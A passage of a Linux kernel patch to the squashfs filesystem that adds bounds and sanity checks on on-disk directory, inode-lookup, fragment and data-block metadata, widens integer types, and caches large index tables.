-	return squashfs_cache_get(sb, msblk->fragment_cache, start_block,
-		length);
+	if (res < 0)
+		return ERR_PTR(res);
+
+	return squashfs_cache_get(sb, msblk->fragment_cache, start_block, res);
 }
 
 
--- a/fs/squashfs/dir.c~a
+++ a/fs/squashfs/dir.c
@@ -22,6 +22,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 static const unsigned char squashfs_filetype_table[] = {
@@ -36,16 +37,17 @@ static const unsigned char squashfs_file
  * (if any) we have managed to read - the index isn't essential, just
  * quicker.
  */
-static int get_dir_index_using_offset(struct super_block *sb,
+static unsigned int get_dir_index_using_offset(struct super_block *sb,
 	u64 *next_block, int *next_offset, u64 index_start, int index_offset,
-	int i_count, u64 f_pos)
+	unsigned int i_count, loff_t max_index, u64 f_pos)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int err, i, index, length = 0;
-	unsigned int size;
+	s64 res;
+	int err;
+	unsigned int i, index, length = 0, size, start_block, block;
 	struct squashfs_dir_index dir_index;
 
-	TRACE("Entered get_dir_index_using_offset, i_count %d, f_pos %lld\n",
+	TRACE("Entered get_dir_index_using_offset, i_count %u, f_pos %lld\n",
 					i_count, f_pos);
 
 	/*
@@ -56,6 +58,18 @@ static int get_dir_index_using_offset(st
 	if (f_pos <= 3)
 		return f_pos;
 	f_pos -= 3;
+	max_index -= 3;
+
+	/*
+	 * A valid index starts at a directory header, and there must be enough
+	 * room for a directory header and one directory entry.
+	 */
+	if (max_index < sizeof(struct squashfs_dir_header) +
+					sizeof(struct squashfs_dir_entry) + 1)
+		return 3;
+
+	max_index -= sizeof(struct squashfs_dir_header) +
+					sizeof(struct squashfs_dir_entry) + 1;
 
 	for (i = 0; i < i_count; i++) {
 		err = squashfs_read_metadata(sb, &dir_index, &index_start,
@@ -63,30 +77,51 @@ static int get_dir_index_using_offset(st
 		if (err < 0)
 			break;
 
+		/* Sanity check the directory index contents */
+
+		/* size should never be larger than SQUASHFS_NAME_LEN */
+		size = le32_to_cpu(dir_index.size) + 1;
+		if (size > SQUASHFS_NAME_LEN)
+			break;
+
+		/* The stored index should not be larger than max_index */
 		index = le32_to_cpu(dir_index.index);
+		if (index > max_index)
+			break;
+
+		block = le32_to_cpu(dir_index.start_block);
+
+		if (i > 0) {
+			/* The stored index should be larger than the previous index */
+			if (index <= length)
+				break;
+
+			/* The start_block should not be less than the previous start_block */
+			if (block < start_block)
+				break;
+		}
+
 		if (index > f_pos)
 			/*
 			 * Found the index we're looking for.
 			 */
 			break;
 
-		size = le32_to_cpu(dir_index.size) + 1;
-
-		/* size should never be larger than SQUASHFS_NAME_LEN */
-		if (size > SQUASHFS_NAME_LEN)
-			break;
-
 		err = squashfs_read_metadata(sb, NULL, &index_start,
 				&index_offset, size);
 		if (err < 0)
 			break;
 
+		res = squashfs_dir_start(block, msblk);
+		if (res < 0)
+			break;
+
+		start_block = block;
 		length = index;
-		*next_block = le32_to_cpu(dir_index.start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
-	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
+	*next_offset = ((u64)length + *next_offset) % SQUASHFS_METADATA_SIZE;
 
 	/*
 	 * Translate back from internal f_pos to external f_pos.
@@ -99,19 +134,15 @@ static int squashfs_readdir(struct file
 {
 	struct inode *inode = file_inode(file);
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	u64 block = squashfs_i(inode)->start + msblk->directory_table;
-	int offset = squashfs_i(inode)->offset, length, err;
+	s64 block;
+	int offset, err;
+	loff_t length;
 	unsigned int inode_number, dir_count, size, type;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
+	struct squashfs_dir_entry *dire = NULL;
 
-	TRACE("Entered squashfs_readdir [%llx:%x]\n", block, offset);
-
-	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
-	if (dire == NULL) {
-		ERROR("Failed to allocate squashfs_dir_entry\n");
-		goto finish;
-	}
+	TRACE("Entered squashfs_readdir [%llx:%x]\n", squashfs_i(inode)->start,
+			squashfs_i(inode)->offset);
 
 	/*
 	 * Return "." and  ".." entries as the first two filenames in the
@@ -142,16 +173,34 @@ static int squashfs_readdir(struct file
 		ctx->pos += size;
 	}
 
+	if (i_size_read(inode) == 3)
+		/* The directory is empty, nothing more to do */
+		goto finish;
+
+	block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
+	if (block < 0)
+		goto failed_read;
+
+	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
+	if (dire == NULL) {
+		ERROR("Failed to allocate squashfs_dir_entry\n");
+		goto finish;
+	}
+
+	offset = squashfs_i(inode)->offset;
 	length = get_dir_index_using_offset(inode->i_sb, &block, &offset,
 				squashfs_i(inode)->dir_idx_start,
 				squashfs_i(inode)->dir_idx_offset,
 				squashfs_i(inode)->dir_idx_cnt,
-				ctx->pos);
+				i_size_read(inode), ctx->pos);
 
 	while (length < i_size_read(inode)) {
 		/*
 		 * Read directory header
 		 */
+		if (!squashfs_dir_space(inode, length, sizeof(dirh)))
+			goto failed_read;
+
 		err = squashfs_read_metadata(inode->i_sb, &dirh, &block,
 					&offset, sizeof(dirh));
 		if (err < 0)
@@ -168,23 +217,30 @@ static int squashfs_readdir(struct file
 			/*
 			 * Read directory entry.
 			 */
+			if (!squashfs_dir_space(inode, length, sizeof(*dire)))
+				goto failed_read;
+
 			err = squashfs_read_metadata(inode->i_sb, dire, &block,
 					&offset, sizeof(*dire));
 			if (err < 0)
 				goto failed_read;
 
+			length += sizeof(*dire);
 			size = le16_to_cpu(dire->size) + 1;
 
 			/* size should never be larger than SQUASHFS_NAME_LEN */
 			if (size > SQUASHFS_NAME_LEN)
 				goto failed_read;
 
+			if (!squashfs_dir_space(inode, length, size))
+				goto failed_read;
+
 			err = squashfs_read_metadata(inode->i_sb, dire->name,
 					&block, &offset, size);
 			if (err < 0)
 				goto failed_read;
 
-			length += sizeof(*dire) + size;
+			length += size;
 
 			if (ctx->pos >= length)
 				continue;
@@ -206,12 +262,14 @@ static int squashfs_readdir(struct file
 		}
 	}
 
-finish:
 	kfree(dire);
+
+finish:
 	return 0;
 
 failed_read:
-	ERROR("Unable to read directory block [%llx:%x]\n", block, offset);
+	ERROR("Unable to read directory [%llx:%x]\n", squashfs_i(inode)->start,
+			squashfs_i(inode)->offset);
 	kfree(dire);
 	return 0;
 }
--- a/fs/squashfs/export.c~a
+++ a/fs/squashfs/export.c
@@ -31,26 +31,67 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
+s64 squashfs_inode_lookup_start(struct super_block *sb, u32 ino_num)
+{
+	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 start;
+	int err;
+
+	if (msblk->lookup_table_is_cache) {
+		s32 length = squashfs_lookup_blocks_bytes(msblk->inodes);
+		s32 base = squashfs_lookup_blocks_base(ino_num - 1);
+		s32 offset = squashfs_lookup_blocks_offset(ino_num - 1);
+		s32 avail = min_t(int, length - base, PAGE_SIZE);
+		struct squashfs_cache_entry *entry;
+
+		start = squashfs_lookup_blocks_start(ino_num - 1, msblk);
+		if (start < 0)
+			return start;
+
+		entry = squashfs_cache_get(sb, msblk->inode_lookup_cache, start,
+					avail | SQUASHFS_COMPRESSED_BIT_BLOCK);
+		if (entry->error < 0) {
+			err = entry->error;
+			squashfs_cache_put(entry);
+			return err;
+		}
+
+		start = le64_to_cpu(((__le64 *)entry->data[0])[offset >> 3]);
+		squashfs_cache_put(entry);
+	} else {
+		s32 blk = squashfs_lookup_block(ino_num - 1);
+
+		start = le64_to_cpu(msblk->inode_lookup_array[blk]);
+	}
+
+	if (start < msblk->lookup_table_start || start >= msblk->lookup_table)
+		return -EIO;
+
+	return start;
+}
+
 /*
  * Look-up inode number (ino) in table, returning the inode location.
  */
-static long long squashfs_inode_lookup(struct super_block *sb, int ino_num)
+static long long squashfs_inode_lookup(struct super_block *sb, u32 ino_num)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int blk = SQUASHFS_LOOKUP_BLOCK(ino_num - 1);
-	int offset = SQUASHFS_LOOKUP_BLOCK_OFFSET(ino_num - 1);
-	u64 start;
+	s32 offset = squashfs_lookup_block_offset(ino_num - 1);
+	s64 start;
 	__le64 ino;
 	int err;
 
-	TRACE("Entered squashfs_inode_lookup, inode_number = %d\n", ino_num);
+	TRACE("Entered squashfs_inode_lookup, inode_number = %u\n", ino_num);
 
 	if (ino_num == 0 || (ino_num - 1) >= msblk->inodes)
 		return -EINVAL;
 
-	start = le64_to_cpu(msblk->inode_lookup_table[blk]);
+	start = squashfs_inode_lookup_start(sb, ino_num);
+	if (start < 0)
+		return start;
 
 	err = squashfs_read_metadata(sb, &ino, &start, &offset, sizeof(ino));
 	if (err < 0)
@@ -112,14 +153,11 @@ static struct dentry *squashfs_get_paren
 /*
  * Read uncompressed inode lookup table indexes off disk into memory
  */
-__le64 *squashfs_read_inode_lookup_table(struct super_block *sb,
+int squashfs_read_inode_lookup_table(struct super_block *sb,
 		u64 lookup_table_start, u64 next_table, unsigned int inodes)
 {
-	unsigned int length = SQUASHFS_LOOKUP_BLOCK_BYTES(inodes);
-	unsigned int indexes = SQUASHFS_LOOKUP_BLOCKS(inodes);
-	int n;
-	__le64 *table;
-	u64 start, end;
+	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s32 length = squashfs_lookup_blocks_bytes(inodes);
 
 	TRACE("In read_inode_lookup_table, length %d\n", length);
 
@@ -127,51 +165,69 @@ __le64 *squashfs_read_inode_lookup_table
 
 	/* there should always be at least one inode */
 	if (inodes == 0)
-		return ERR_PTR(-EINVAL);
+		return -EIO;
 
 	/*
 	 * The computed size of the lookup table (length bytes) should exactly
 	 * match the table start and end points
 	 */
-	if (length != (next_table - lookup_table_start))
-		return ERR_PTR(-EINVAL);
-
-	table = squashfs_read_table(sb, lookup_table_start, length);
-	if (IS_ERR(table))
-		return table;
+	if (lookup_table_start >= next_table ||
+				length != (next_table - lookup_table_start))
+		return -EIO;
+
+	if (length <= (PAGE_SIZE * 4)) {
+		/* Read lookup table index into memory */
+		s32 indexes = squashfs_lookup_blocks(inodes);
+		__le64 *array;
+		u64 start, end;
+		int n;
+
+		array = squashfs_read_table(sb, lookup_table_start, length);
+		if (IS_ERR(array))
+			return PTR_ERR(array);
+
+		/*
+		 * array0], array[1], ... array[indexes - 1] store the locations
+		 * of the compressed inode lookup blocks.  Each entry should be
+		 * less than the next (i.e. array[0] < array[1]), and the difference
+		 * between them should be SQUASHFS_METADATA_SIZE or less.
+		 * array[indexes - 1] should  be less than lookup_array_start, and
+		 * again the difference should be SQUASHFS_METADATA_SIZE or less
+		 */
+		for (n = 0; n < (indexes - 1); n++) {
+			start = le64_to_cpu(array[n]);
+			end = le64_to_cpu(array[n + 1]);
+
+			if (start >= end || (end - start) > (SQUASHFS_METADATA_SIZE
+						+ SQUASHFS_BLOCK_OFFSET)) {
+				kfree(array);
+				return -EIO;
+			}
+		}
 
-	/*
-	 * table0], table[1], ... table[indexes - 1] store the locations
-	 * of the compressed inode lookup blocks.  Each entry should be
-	 * less than the next (i.e. table[0] < table[1]), and the difference
-	 * between them should be SQUASHFS_METADATA_SIZE or less.
-	 * table[indexes - 1] should  be less than lookup_table_start, and
-	 * again the difference should be SQUASHFS_METADATA_SIZE or less
-	 */
-	for (n = 0; n < (indexes - 1); n++) {
-		start = le64_to_cpu(table[n]);
-		end = le64_to_cpu(table[n + 1]);
-
-		if (start >= end
-		    || (end - start) >
-		    (SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
-			kfree(table);
-			return ERR_PTR(-EINVAL);
+		start = le64_to_cpu(array[indexes - 1]);
+		if (start >= lookup_table_start || (lookup_table_start - start) >
+			    (SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
+			kfree(array);
+			return -EIO;
 		}
-	}
 
-	start = le64_to_cpu(table[indexes - 1]);
-	if (start >= lookup_table_start ||
-	    (lookup_table_start - start) >
-	    (SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
-		kfree(table);
-		return ERR_PTR(-EINVAL);
+		msblk->inode_lookup_array = array;
+		msblk->lookup_table_is_cache = false;
+	} else {
+		/* Use a cache to store the last 4 pages of indexes read */
+		struct squashfs_cache *cache = squashfs_cache_init("inode index", 4, PAGE_SIZE);
+
+		if (IS_ERR(cache))
+			return PTR_ERR(cache);
+
+		msblk->inode_lookup_cache = cache;
+		msblk->lookup_table_is_cache = true;
 	}
 
-	return table;
+	return 0;
 }
 
-
 const struct export_operations squashfs_export_ops = {
 	.encode_fh = generic_encode_ino32_fh,
 	.fh_to_dentry = squashfs_fh_to_dentry,
--- a/fs/squashfs/file.c~a
+++ a/fs/squashfs/file.c
@@ -35,10 +35,12 @@
 #include <linux/string.h>
 #include <linux/pagemap.h>
 #include <linux/mutex.h>
+#include <linux/math64.h>
 
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "page_actor.h"
 
@@ -159,11 +161,12 @@ static void release_meta_index(struct in
  * Read the next n blocks from the block list, starting from
  * metadata block <start_block, offset>.
  */
-static long long read_indexes(struct super_block *sb, int n,
+static long long read_indexes(struct super_block *sb, s64 n,
 				u64 *start_block, int *offset)
 {
 	int err, i;
 	long long block = 0;
+	struct squashfs_sb_info *msblk = sb->s_fs_info;
 	__le32 *blist = kmalloc(PAGE_SIZE, GFP_KERNEL);
 
 	if (blist == NULL) {
@@ -172,7 +175,7 @@ static long long read_indexes(struct sup
 	}
 
 	while (n) {
-		int blocks = min_t(int, n, PAGE_SIZE >> 2);
+		int blocks = min_t(s64, n, PAGE_SIZE >> 2);
 
 		err = squashfs_read_metadata(sb, blist, start_block,
 				offset, blocks << 2);
@@ -183,12 +186,12 @@ static long long read_indexes(struct sup
 		}
 
 		for (i = 0; i < blocks; i++) {
-			int size = squashfs_block_size(blist[i]);
+			int size = squashfs_data_size(blist[i], msblk->block_size);
 			if (size < 0) {
 				err = size;
 				goto failure;
 			}
-			block += SQUASHFS_COMPRESSED_SIZE_BLOCK(size);
+			block += squashfs_compressed_size_block(size);
 		}
 		n -= blocks;
 	}
@@ -215,7 +218,7 @@ failure:
  */
 static inline int calculate_skip(u64 blocks)
 {
-	u64 skip = blocks / ((SQUASHFS_META_ENTRIES + 1)
+	u64 skip = div_u64(blocks, (SQUASHFS_META_ENTRIES + 1)
 		 * SQUASHFS_META_INDEXES);
 	return min((u64) SQUASHFS_CACHED_BLKS - 1, skip + 1);
 }
@@ -226,7 +229,7 @@ static inline int calculate_skip(u64 blo
  * on-disk locations of the datablock and block list metadata block
  * <index_block, index_offset> for index (scaled to nearest cache index).
  */
-static int fill_meta_index(struct inode *inode, int index,
+static s64 fill_meta_index(struct inode *inode, s64 index,
 		u64 *index_block, int *index_offset, u64 *data_block)
 {
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
@@ -242,7 +245,7 @@ static int fill_meta_index(struct inode
 	/*
 	 * Scale index to cache index (cache slot entry)
 	 */
-	index /= SQUASHFS_META_INDEXES * skip;
+	index = div_u64(index, SQUASHFS_META_INDEXES * skip);
 
 	while (offset < index) {
 		meta = locate_meta_index(inode, offset + 1, index);
@@ -278,6 +281,9 @@ static int fill_meta_index(struct inode
 			long long res = read_indexes(inode->i_sb, blocks,
 					&cur_index_block, &cur_offset);
 
+			if (res >= 0)
+				res = squashfs_add_indexes(cur_data_block, res, msblk);
+
 			if (res < 0) {
 				if (meta->entries == 0)
 					/*
@@ -289,7 +295,7 @@ static int fill_meta_index(struct inode
 				goto failed;
 			}
 
-			cur_data_block += res;
+			cur_data_block = res;
 			meta_entry = &meta->meta_entry[i - meta->offset];
 			meta_entry->index_block = cur_index_block -
 				msblk->inode_table;
@@ -314,7 +320,7 @@ all_done:
 	/*
 	 * Scale cache index (cache slot entry) to index
 	 */
-	return offset * SQUASHFS_META_INDEXES * skip;
+	return (s64)offset * SQUASHFS_META_INDEXES * skip;
 
 failed:
 	release_meta_index(inode, meta);
@@ -326,14 +332,15 @@ failed:
  * Get the on-disk location and compressed size of the datablock
  * specified by index.  Fill_meta_index() does most of the work.
  */
-static int read_blocklist_ptrs(struct inode *inode, int index, u64 *start,
+static int read_blocklist_ptrs(struct inode *inode, s64 index, u64 *start,
 	int *offset, u64 *block)
 {
 	long long blks;
 	__le32 size;
-	int res = fill_meta_index(inode, index, start, offset, block);
+	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
+	s64 res = fill_meta_index(inode, index, start, offset, block);
 
-	TRACE("read_blocklist: res %d, index %d, start 0x%llx, offset 0x%x, block 0x%llx\n",
+	TRACE("read_blocklist: res %lld, index %lld, start 0x%llx, offset 0x%x, block 0x%llx\n",
 				res, index, *start, *offset, block ? *block : 0);
 
 	if (res < 0)
@@ -349,8 +356,13 @@ static int read_blocklist_ptrs(struct in
 		blks = read_indexes(inode->i_sb, index - res, start, offset);
 		if (blks < 0)
 			return (int) blks;
-		if (block)
-			*block += blks;
+		if (block) {
+			res = squashfs_add_indexes(*block, blks, msblk);
+			if (res < 0)
+				return (int) res;
+
+			*block = res;
+		}
 	}
 
 	/*
@@ -360,10 +372,10 @@ static int read_blocklist_ptrs(struct in
 			sizeof(size));
 	if (res < 0)
 		return res;
-	return squashfs_block_size(size);
+	return squashfs_data_size(size, msblk->block_size);
 }
 
-static inline int read_blocklist(struct inode *inode, int index, u64 *block)
+static inline int read_blocklist(struct inode *inode, s64 index, u64 *block)
 {
 	u64 start;
 	int offset;
@@ -396,8 +408,9 @@ void squashfs_copy_cache(struct folio *f
 	struct address_space *mapping = folio->mapping;
 	struct inode *inode = mapping->host;
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	int i, mask = (1 << (msblk->block_log - PAGE_SHIFT)) - 1;
-	int start_index = folio->index & ~mask, end_index = start_index | mask;
+	s64 i, mask = (1 << (msblk->block_log - PAGE_SHIFT)) - 1;
+	s64 start_index = folio->index & ~mask, end_index = start_index | mask;
+	size_t avail;
 
 	/*
 	 * Loop copying datablock into pages.  As the datablock likely covers
@@ -405,13 +418,14 @@ void squashfs_copy_cache(struct folio *f
 	 * grab the pages from the page cache, except for the page that we've
 	 * been called to fill.
 	 */
-	for (i = start_index; i <= end_index && bytes > 0; i++,
-			bytes -= PAGE_SIZE, offset += PAGE_SIZE) {
+	for (i = start_index; i <= end_index && bytes; i++,
+			bytes -= avail, offset += avail) {
 		struct folio *push_folio;
-		size_t avail = buffer ? min(bytes, PAGE_SIZE) : 0;
 		bool updated = false;
 
-		TRACE("bytes %zu, i %d, available_bytes %zu\n", bytes, i, avail);
+		avail = min(bytes, PAGE_SIZE);
+
+		TRACE("bytes %zu, i %lld, available_bytes %zu\n", bytes, i, avail);
 
 		push_folio = (i == folio->index) ? folio :
 			__filemap_get_folio(mapping, i,
@@ -424,7 +438,7 @@ void squashfs_copy_cache(struct folio *f
 		if (folio_test_uptodate(push_folio))
 			goto skip_folio;
 
-		updated = squashfs_fill_page(push_folio, buffer, offset, avail);
+		updated = squashfs_fill_page(push_folio, buffer, offset, buffer ? avail : 0);
 skip_folio:
 		folio_end_read(push_folio, updated);
 		if (i != folio->index)
@@ -439,7 +453,7 @@ static int squashfs_readpage_fragment(st
 	struct squashfs_cache_entry *buffer = squashfs_get_fragment(inode->i_sb,
 		squashfs_i(inode)->fragment_block,
 		squashfs_i(inode)->fragment_size);
-	int res = buffer->error;
+	int res = IS_ERR(buffer) ? PTR_ERR(buffer) : buffer->error;
 
 	if (res)
 		ERROR("Unable to read page, block %llx, size %x\n",
@@ -449,7 +463,8 @@ static int squashfs_readpage_fragment(st
 		squashfs_copy_cache(folio, buffer, expected,
 			squashfs_i(inode)->fragment_offset);
 
-	squashfs_cache_put(buffer);
+	if (!IS_ERR(buffer))
+		squashfs_cache_put(buffer);
 	return res;
 }
 
@@ -463,8 +478,8 @@ static int squashfs_read_folio(struct fi
 {
 	struct inode *inode = folio->mapping->host;
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	int index = folio->index >> (msblk->block_log - PAGE_SHIFT);
-	int file_end = i_size_read(inode) >> msblk->block_log;
+	s64 index = folio->index >> (msblk->block_log - PAGE_SHIFT);
+	s64 file_end = i_size_read(inode) >> msblk->block_log;
 	int expected = index == file_end ?
 			(i_size_read(inode) & (msblk->block_size - 1)) :
 			 msblk->block_size;
@@ -487,8 +502,11 @@ static int squashfs_read_folio(struct fi
 
 		if (res == 0)
 			res = squashfs_readpage_sparse(folio, expected);
-		else
-			res = squashfs_readpage_block(folio, block, res, expected);
+		else {
+			res = squashfs_check_range(block, res, msblk);
+			if (res >= 0)
+				res = squashfs_readpage_block(folio, block, res, expected);
+		}
 	} else
 		res = squashfs_readpage_fragment(folio, expected);
 
@@ -515,6 +533,9 @@ static int squashfs_readahead_fragment(s
 	void *addr;
 	struct page *last_page;
 
+	if (IS_ERR(buffer))
+		return 1;
+
 	if (buffer->error)
 		goto out;
 
@@ -575,15 +596,15 @@ static void squashfs_readahead(struct re
 {
 	struct inode *inode = ractl->mapping->host;
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	size_t mask = (1UL << msblk->block_log) - 1;
+	s64 mask = (1UL << msblk->block_log) - 1;
 	unsigned short shift = msblk->block_log - PAGE_SHIFT;
 	loff_t start = readahead_pos(ractl) & ~mask;
-	size_t len = readahead_length(ractl) + readahead_pos(ractl) - start;
+	s64 len = readahead_length(ractl) + readahead_pos(ractl) - start;
 	struct squashfs_page_actor *actor;
 	unsigned int nr_pages = 0;
 	struct page **pages;
 	int i;
-	loff_t file_end = i_size_read(inode) >> msblk->block_log;
+	s64 file_end = i_size_read(inode) >> msblk->block_log;
 	unsigned int max_pages = 1UL << shift;
 
 	readahead_expand(ractl, start, (len | mask) + 1);
@@ -621,7 +642,11 @@ static void squashfs_readahead(struct re
 		}
 
 		bsize = read_blocklist(inode, start >> msblk->block_log, &block);
-		if (bsize == 0)
+		if (bsize <= 0)
+			goto skip_pages;
+
+		bsize = squashfs_check_range(block, bsize, msblk);
+		if (bsize < 0)
 			goto skip_pages;
 
 		actor = squashfs_page_actor_init_special(msblk, pages, nr_pages,
@@ -718,7 +743,7 @@ static loff_t seek_hole_data(struct file
 			goto finished;
 
 		for (i = 0; i < indexes; i++) {
-			length = squashfs_block_size(blist[i]);
+			length = squashfs_data_size(blist[i], msblk->block_size);
 			if (length < 0) {
 				offset = length;
 				goto finished;
--- a/fs/squashfs/fragment.c~a
+++ a/fs/squashfs/fragment.c
@@ -26,64 +26,123 @@
 
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
+s64 squashfs_frag_lookup_start(struct super_block *sb, u32 fragment)
+{
+	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 start;
+
+	if (msblk->fragment_index_is_cache) {
+		s32 length = squashfs_fragment_indexes_bytes(msblk->fragments);
+		s32 base = squashfs_fragment_indexes_base(fragment);
+		s32 offset = squashfs_fragment_indexes_offset(fragment);
+		s32 avail = min_t(int, length - base, PAGE_SIZE);
+		struct squashfs_cache_entry *entry;
+
+		start = squashfs_fragment_indexes_start(fragment, msblk);
+		if (start < 0)
+			return start;
+
+		entry = squashfs_cache_get(sb, msblk->fragment_index_cache,
+				start, avail | SQUASHFS_COMPRESSED_BIT_BLOCK);
+		if (entry->error < 0) {
+			int err = entry->error;
+
+			squashfs_cache_put(entry);
+			return err;
+		}
+
+		start = le64_to_cpu(((__le64 *)entry->data[0])[offset >> 3]);
+		squashfs_cache_put(entry);
+	} else {
+		s32 block = squashfs_fragment_index(fragment);
+
+		start = le64_to_cpu(msblk->fragment_index_array[block]);
+	}
+
+	if (start < msblk->fragment_table_start || start >= msblk->fragment_table)
+		return -EIO;
+
+	return start;
+}
+
 /*
  * Look-up fragment using the fragment index table.  Return the on disk
  * location of the fragment and its compressed size
  */
+
 int squashfs_frag_lookup(struct super_block *sb, unsigned int fragment,
-				u64 *fragment_block)
+				u64 *fragment_block, int *fragment_size)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int block, offset, size;
+	s32 offset, size;
 	struct squashfs_fragment_entry fragment_entry;
-	u64 start_block;
+	s64 start;
 
 	if (fragment >= msblk->fragments)
 		return -EIO;
-	block = SQUASHFS_FRAGMENT_INDEX(fragment);
-	offset = SQUASHFS_FRAGMENT_INDEX_OFFSET(fragment);
 
-	start_block = le64_to_cpu(msblk->fragment_index[block]);
+	start = squashfs_frag_lookup_start(sb, fragment);
+	if (start < 0)
+		return start;
 
-	size = squashfs_read_metadata(sb, &fragment_entry, &start_block,
+	offset = squashfs_fragment_index_offset(fragment);
+	size = squashfs_read_metadata(sb, &fragment_entry, &start,
 					&offset, sizeof(fragment_entry));
 	if (size < 0)
 		return size;
 
 	*fragment_block = le64_to_cpu(fragment_entry.start_block);
-	return squashfs_block_size(fragment_entry.size);
+	*fragment_size = le32_to_cpu(fragment_entry.size);
+	return 0;
 }
-
-
 /*
  * Read the uncompressed fragment lookup table indexes off disk into memory
  */
-__le64 *squashfs_read_fragment_index_table(struct super_block *sb,
+int squashfs_read_fragment_index_table(struct super_block *sb,
 	u64 fragment_table_start, u64 next_table, unsigned int fragments)
 {
-	unsigned int length = SQUASHFS_FRAGMENT_INDEX_BYTES(fragments);
-	__le64 *table;
+	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s32 length = squashfs_fragment_indexes_bytes(fragments);
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
-		return ERR_PTR(-EINVAL);
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
+		return -EINVAL;
+
+	if (length <= (PAGE_SIZE * 4)) {
+		/* Read fragment index into memory */
+		__le64 *array = squashfs_read_table(sb, fragment_table_start, length);
+
+		if (IS_ERR(array))
+			return PTR_ERR(array);
+
+		/*
+		 * table[0] points to the first fragment table metadata block, this
+		 * should be less than fragment_table_start
+		 */
+		if (le64_to_cpu(array[0]) >= fragment_table_start) {
+			kfree(array);
+			return -EINVAL;
+		}
+
+		msblk->fragment_index_array = array;
+		msblk->fragment_index_is_cache = false;
+	} else {
+		/* Use a cache to store the last 16Kbytes of indexes read */
+		struct squashfs_cache *cache = squashfs_cache_init("fragment index", 4, PAGE_SIZE);
 
-	table = squashfs_read_table(sb, fragment_table_start, length);
+		if (IS_ERR(cache))
+			return PTR_ERR(cache);
 
-	/*
-	 * table[0] points to the first fragment table metadata block, this
-	 * should be less than fragment_table_start
-	 */
-	if (!IS_ERR(table) && le64_to_cpu(table[0]) >= fragment_table_start) {
-		kfree(table);
-		return ERR_PTR(-EINVAL);
+		msblk->fragment_index_cache = cache;
+		msblk->fragment_index_is_cache = true;
 	}
 
-	return table;
+	return 0;
 }
--- a/fs/squashfs/id.c~a
+++ a/fs/squashfs/id.c
@@ -24,6 +24,7 @@
 
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 /*
@@ -33,8 +34,8 @@ int squashfs_get_id(struct super_block *
 					unsigned int *id)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int block = SQUASHFS_ID_BLOCK(index);
-	int offset = SQUASHFS_ID_BLOCK_OFFSET(index);
+	int block = squashfs_id_block(index);
+	int offset = squashfs_id_block_offset(index);
 	u64 start_block;
 	__le32 disk_id;
 	int err;
@@ -60,8 +61,8 @@ int squashfs_get_id(struct super_block *
 __le64 *squashfs_read_id_index_table(struct super_block *sb,
 		u64 id_table_start, u64 next_table, unsigned short no_ids)
 {
-	unsigned int length = SQUASHFS_ID_BLOCK_BYTES(no_ids);
-	unsigned int indexes = SQUASHFS_ID_BLOCKS(no_ids);
+	unsigned int length = squashfs_id_block_bytes(no_ids);
+	unsigned int indexes = squashfs_id_blocks(no_ids);
 	int n;
 	__le64 *table;
 	u64 start, end;
--- a/fs/squashfs/inode.c~a
+++ a/fs/squashfs/inode.c
@@ -33,6 +33,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "xattr.h"
 
@@ -108,19 +109,23 @@ int squashfs_read_inode(struct inode *in
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 block = SQUASHFS_INODE_BLK(ino) + msblk->inode_table;
-	int err, type, offset = SQUASHFS_INODE_OFFSET(ino);
+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
+	int offset = squashfs_inode_offset(ino), soffset = offset;
+	int err, type;
 	union squashfs_inode squashfs_ino;
 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
 	int xattr_id = SQUASHFS_INVALID_XATTR;
 
 	TRACE("Entered squashfs_read_inode\n");
 
+	if (block < 0)
+		goto bad_block_val;
+
 	/*
 	 * Read inode base common to all inode types.
 	 */
-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
-				&offset, sizeof(*sqshb_ino));
+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
